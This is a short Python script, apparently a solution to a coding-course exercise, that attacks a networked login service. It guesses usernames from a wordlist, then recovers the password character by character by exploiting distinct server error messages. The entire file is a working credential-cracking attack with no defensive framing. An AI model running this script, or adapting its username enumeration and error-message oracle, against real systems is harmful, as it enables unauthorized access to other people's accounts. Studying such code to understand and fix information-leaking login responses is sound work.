from sys import argv
from string import ascii_letters, digits
import socket
import json


class Hacker:

    def __init__(self):
        hostname, port = argv[1], int(argv[2])
        self.address = (hostname, port)

    @staticmethod
    def get_logins():
        with open("logins.txt", "r") as logins:
            for login in logins.readlines():
                yield login.strip()

    @staticmethod
    def send(_socket, data):
        _socket.send(json.dumps(data).encode())
        return json.loads(_socket.recv(1024).decode())

    def find_login(self, _socket):
        for login_attempt in self.get_logins():
            credentials = {"login": login_attempt, "password": " "}

            response = self.send(_socket, credentials)["result"]
            if response == "Wrong password!":
                return login_attempt

    def find_password(self, _socket, login):
        password = ""
        chars = ascii_letters + digits

        while True:
            for char in chars:
                credentials = {"login": login, "password": password + char}

                response = self.send(_socket, credentials)["result"]
                if response == "Exception happened during login":
                    password += char
                    break
                elif response == "Connection success!":
                    return password + char

    def hack(self):
        with socket.socket() as client:
            client.connect(self.address)

            login = self.find_login(client)
            password = self.find_password(client, login)

            credentials = {"login": login, "password": password}

            print(json.dumps(credentials))


if __name__ == "__main__":
    hacker = Hacker()
    hacker.hack()
